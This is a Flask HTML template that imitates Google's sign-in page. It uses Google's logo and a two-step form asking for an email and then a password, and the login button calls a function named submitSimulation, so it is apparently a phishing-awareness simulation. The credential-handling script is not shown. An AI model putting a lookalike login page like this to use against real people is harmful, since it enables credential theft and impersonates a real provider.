<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Secure Account Sign In</title>

    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap"
        rel="stylesheet"
    >

    <link
        rel="stylesheet"
        href="{{ url_for('static', filename='style.css') }}"
    >

</head>

<body>

    <div class="card">

        <div class="logo">

            <img
                src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
                alt="Google Logo"
            >

        </div>

        <h2 id="title">
            Sign in
        </h2>

        <div class="subtitle">
            to continue to Mail
        </div>

        <div id="step1">

            <div class="input-box">

                <input
                    type="text"
                    id="email"
                    placeholder="Email or phone"
                    autocomplete="off"
                >

            </div>

            <div class="actions">

                <span class="link">
                    Forgot email?
                </span>

                <button onclick="nextStep()">
                    Next
                </button>

            </div>

        </div>

        <div id="step2">

            <div class="input-box">

                <input
                    type="password"
                    id="password"
                    placeholder="Enter your password"
                    autocomplete="off"
                >

            </div>

            <div class="actions">

                <span class="link">
                    Forgot password?
                </span>

                <button onclick="submitSimulation()">
                    Login
                </button>

            </div>

        </div>

        <div
            class="loading"
            id="loading"
        >
            Checking information...
        </div>

    </div>

    <script
        src="{{ url_for('static', filename='script.js') }}"
    ></script>

</body>

</html>
